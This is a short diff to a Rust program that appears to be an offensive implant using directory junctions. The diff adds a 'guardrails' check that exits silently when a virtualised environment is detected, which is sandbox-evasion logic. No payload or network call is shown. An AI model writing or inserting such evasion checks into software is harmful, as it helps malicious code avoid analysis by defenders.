@@ -29,6 +29,12 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     if !junction::exists(&junc_path)? {
         #[cfg(feature = "debug")]
         println!("[*] Checking guardrails...");
+        if !guardrails::check_guardrails() {
+            #[cfg(feature = "debug")]
+            println!("[*] Possibly a virtualised environment. Exiting...");
+
+            return Ok(());
+        }
 
         #[cfg(feature = "debug")]
         println!("[*] Creating dir junction...");
